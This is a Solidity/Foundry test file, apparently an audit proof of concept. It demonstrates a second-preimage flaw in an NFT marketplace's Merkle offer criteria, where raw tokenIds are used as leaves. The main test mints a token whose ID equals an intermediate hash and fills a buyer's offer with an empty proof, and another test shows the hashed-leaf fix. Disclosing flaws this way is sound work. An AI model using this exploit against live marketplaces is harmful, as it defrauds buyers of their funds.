// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "src/VulnerableNFTMarketplace.sol";

/**
 * @title MockNFT
 * @dev Simple NFT contract for testing purposes
 */
contract MockNFT is ERC721 {
    uint256 private _currentTokenId;

    constructor() ERC721("MockNFT", "MNFT") {}

    function mint(address to) external returns (uint256) {
        uint256 tokenId = ++_currentTokenId;
        _mint(to, tokenId);
        return tokenId;
    }

    function mintSpecific(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }
}

/**
 * @title VulnerabilityTest
 * @dev Test contract demonstrating the Merkle tree leaf vulnerability
 *      where tokenIds are used directly as leaves instead of being hashed
 */
contract VulnerabilityTest is Test {
    VulnerableNFTMarketplace public marketplace;
    MockNFT public nft;
    
    address public alice = makeAddr("alice");  // Buyer creating offers
    address public bob = makeAddr("bob");      // Legitimate seller
    address public attacker = makeAddr("attacker"); // Attacker exploiting vulnerability
    address public owner = makeAddr("owner");  // Marketplace owner

    // Test scenario: Alice wants to buy NFTs with tokenIds 1 or 2
    uint256 constant TOKEN_ID_1 = 1;
    uint256 constant TOKEN_ID_2 = 2;
    uint256 constant OFFER_PRICE = 1 ether;

    event log_bytes32(string key, bytes32 val);

    function setUp() public {
        // Deploy contracts
        vm.prank(owner);
        marketplace = new VulnerableNFTMarketplace();
        nft = new MockNFT();

        // Give Alice some ETH for creating offers
        vm.deal(alice, 10 ether);
        
        // Mint NFTs to legitimate sellers
        nft.mintSpecific(bob, TOKEN_ID_1);
        nft.mintSpecific(bob, TOKEN_ID_2);
        
        // Approve marketplace for Bob's NFTs
        vm.prank(bob);
        nft.setApprovalForAll(address(marketplace), true);
    }

    /**
     * @dev Test that demonstrates the vulnerability where intermediate hash values
     *      can be used as valid tokenIds to fulfill offers
     */
    function testMerkleTreeVulnerability() public {
        console.log("=== Testing Merkle Tree Vulnerability ===");
        
        // Step 1: Calculate the Merkle root for tokenIds 1 and 2
        bytes32 leaf1 = bytes32(TOKEN_ID_1);  // Direct tokenId as leaf (vulnerable approach)
        bytes32 leaf2 = bytes32(TOKEN_ID_2);  // Direct tokenId as leaf (vulnerable approach)
        
        // Calculate intermediate hash
        bytes32 intermediateHash;
        if (leaf1 <= leaf2) {
            intermediateHash = keccak256(abi.encodePacked(leaf1, leaf2));
        } else {
            intermediateHash = keccak256(abi.encodePacked(leaf2, leaf1));
        }
        
        // The root in this simple case is the intermediate hash itself
        bytes32 merkleRoot = intermediateHash;
        
        console.log("Token ID 1:", TOKEN_ID_1);
        console.log("Token ID 2:", TOKEN_ID_2);
        emit log_bytes32("Leaf 1 (tokenId 1)", leaf1);
        emit log_bytes32("Leaf 2 (tokenId 2)", leaf2);
        emit log_bytes32("Intermediate Hash", intermediateHash);
        emit log_bytes32("Merkle Root", merkleRoot);
        
        // Step 2: Alice creates an offer with the Merkle tree criteria
        vm.prank(alice);
        marketplace.createOffer{value: OFFER_PRICE}(
            address(nft),
            address(0), // ETH payment
            OFFER_PRICE,
            merkleRoot,
            block.timestamp + 1 hours,
            1 // Only want to buy 1 NFT
        );
        
        uint256 offerId = 0; // First offer
        
        // Step 3: Verify legitimate use works (Bob can sell tokenId 1)
        console.log("\n--- Testing Legitimate Use ---");
        
        // Create proof for tokenId 1
        bytes32[] memory proofForToken1 = new bytes32[](1);
        proofForToken1[0] = leaf2; // Proof that token 1 is in the tree
        
        // Bob fulfills the offer with tokenId 1 (this should work)
        uint256 bobBalanceBefore = bob.balance;
        
        vm.prank(bob);
        marketplace.fulfillOffer(offerId, TOKEN_ID_1, proofForToken1);
        
        uint256 bobBalanceAfter = bob.balance;
        console.log("Bob's balance increased by:", (bobBalanceAfter - bobBalanceBefore) / 1e18, "ETH");
        
        // Verify the NFT was transferred to Alice
        assertEq(nft.ownerOf(TOKEN_ID_1), alice);
        console.log("Token ID 1 successfully transferred to Alice");
        
        // Step 4: Reset for vulnerability demonstration
        console.log("\n--- Resetting for Vulnerability Demo ---");
        
        // Create a new offer since the first one is fulfilled
        vm.prank(alice);
        marketplace.createOffer{value: OFFER_PRICE}(
            address(nft),
            address(0), // ETH payment
            OFFER_PRICE,
            merkleRoot,
            block.timestamp + 1 hours,
            1 // Only want to buy 1 NFT
        );
        
        uint256 newOfferId = 1; // Second offer
        
        // Step 5: Demonstrate the vulnerability
        console.log("\n--- Demonstrating Vulnerability ---");
        
        // The intermediate hash can be converted to a uint256 and used as a tokenId
        uint256 exploitTokenId = uint256(intermediateHash);
        console.log("Exploit Token ID (intermediate hash as uint256):", exploitTokenId);
        
        // Mint an NFT with the exploit tokenId to the attacker
        nft.mintSpecific(attacker, exploitTokenId);
        
        // Approve marketplace for attacker's NFT
        vm.prank(attacker);
        nft.setApprovalForAll(address(marketplace), true);
        
        // Create "proof" for the exploit tokenId
        // Since the tokenId equals the intermediate hash, the proof is empty!
        bytes32[] memory exploitProof = new bytes32[](0);
        
        console.log("Attacker attempting to fulfill offer with unintended tokenId...");
        
        // Attacker fulfills the offer with the exploit tokenId
        uint256 attackerBalanceBefore = attacker.balance;
        
        vm.prank(attacker);
        marketplace.fulfillOffer(newOfferId, exploitTokenId, exploitProof);
        
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Attacker's balance increased by:", (attackerBalanceAfter - attackerBalanceBefore) / 1e18, "ETH");
        
        // Verify the exploit NFT was transferred to Alice
        assertEq(nft.ownerOf(exploitTokenId), alice);
        console.log("Exploit successful! Alice received unintended tokenId:", exploitTokenId);
        
        // Step 6: Verify Alice received an unintended NFT
        console.log("\n--- Vulnerability Impact ---");
        console.log("Alice intended to buy tokenId 1 or 2");
        console.log("Alice actually received tokenId:", exploitTokenId);
        console.log("This tokenId was NOT in Alice's intended criteria!");
        
        // Demonstrate that the exploit tokenId is much larger than intended
        assertTrue(exploitTokenId > 1000000, "Exploit tokenId should be much larger than intended");
        assertTrue(exploitTokenId != TOKEN_ID_1 && exploitTokenId != TOKEN_ID_2, "Exploit tokenId should not be 1 or 2");
    }

    /**
     * @dev Test demonstrating how the fix would prevent the vulnerability
     */
    function testProperMerkleTreeImplementation() public {
        console.log("\n=== Testing Proper Implementation (Fixed) ===");
        
        // In a proper implementation, leaves should be hashed
        bytes32 hashedLeaf1 = keccak256(abi.encodePacked(TOKEN_ID_1));
        bytes32 hashedLeaf2 = keccak256(abi.encodePacked(TOKEN_ID_2));
        
        // Calculate proper intermediate hash with hashed leaves
        bytes32 properIntermediateHash;
        if (hashedLeaf1 <= hashedLeaf2) {
            properIntermediateHash = keccak256(abi.encodePacked(hashedLeaf1, hashedLeaf2));
        } else {
            properIntermediateHash = keccak256(abi.encodePacked(hashedLeaf2, hashedLeaf1));
        }
        
        console.log("With proper hashing:");
        emit log_bytes32("Hashed Leaf 1", hashedLeaf1);
        emit log_bytes32("Hashed Leaf 2", hashedLeaf2);
        emit log_bytes32("Proper Intermediate Hash", properIntermediateHash);
        
        // Convert proper intermediate hash to tokenId
        uint256 properExploitAttempt = uint256(properIntermediateHash);
        console.log("Attempted exploit tokenId with proper hashing:", properExploitAttempt);

        assertTrue(properIntermediateHash != bytes32(TOKEN_ID_1), "Proper hash should not equal tokenId 1");
        assertTrue(properIntermediateHash != bytes32(TOKEN_ID_2), "Proper hash should not equal tokenId 2");
        
        console.log("With proper hashing, intermediate values cannot be used as valid tokenIds");
    }

    /**
     * @dev Helper function to visualize Merkle tree structure
     */
    function testMerkleTreeStructure() public pure {
        console.log("\n=== Merkle Tree Structure ===");
        console.log("Vulnerable approach (tokenIds as leaves):");
        console.log("  Root: hash(tokenId1, tokenId2)");
        console.log(" Leaf: tokenId1 (1)");
        console.log(" Leaf: tokenId2 (2)");
        console.log("");
        console.log("Proper approach (hashed tokenIds as leaves):");
        console.log("  Root: hash(hash(tokenId1), hash(tokenId2))");
        console.log(" Leaf: hash(tokenId1)");
        console.log(" Leaf: hash(tokenId2)");
        console.log("");
        console.log("The vulnerability allows using intermediate hashes as valid tokenIds!");
    }

    /**
     * @dev Test edge case with larger Merkle tree to show broader impact
     */
    function testLargerMerkleTreeVulnerability() public {
        console.log("\n=== Testing Larger Merkle Tree ===");
        
        // Create a Merkle tree with 4 tokenIds: 10, 20, 30, 40
        uint256[4] memory tokenIds = [uint256(10), 20, 30, 40];
        bytes32[4] memory leaves;
        
        // Convert tokenIds to leaves
        for (uint i = 0; i < 4; i++) {
            leaves[i] = bytes32(tokenIds[i]);
        }
        
        // Build the tree manually
        bytes32 hash1 = keccak256(abi.encodePacked(leaves[0], leaves[1])); // hash(10, 20)
        bytes32 hash2 = keccak256(abi.encodePacked(leaves[2], leaves[3])); // hash(30, 40)
        bytes32 root = keccak256(abi.encodePacked(hash1, hash2));
        
        console.log("Merkle tree with 4 tokenIds: 10, 20, 30, 40");
        emit log_bytes32("Intermediate hash 1 (10,20)", hash1);
        emit log_bytes32("Intermediate hash 2 (30,40)", hash2);
        emit log_bytes32("Root hash", root);
        
        // All intermediate hashes and the root can be used as exploit tokenIds
        uint256 exploitTokenId1 = uint256(hash1);
        uint256 exploitTokenId2 = uint256(hash2);
        uint256 exploitTokenId3 = uint256(root);
        
        console.log("Potential exploit tokenIds:");
        console.log("- Intermediate hash 1 as tokenId:", exploitTokenId1);
        console.log("- Intermediate hash 2 as tokenId:", exploitTokenId2);
        console.log("- Root hash as tokenId:", exploitTokenId3);
        
        console.log("All of these unintended tokenIds could be used to fulfill offers!");
    }
}
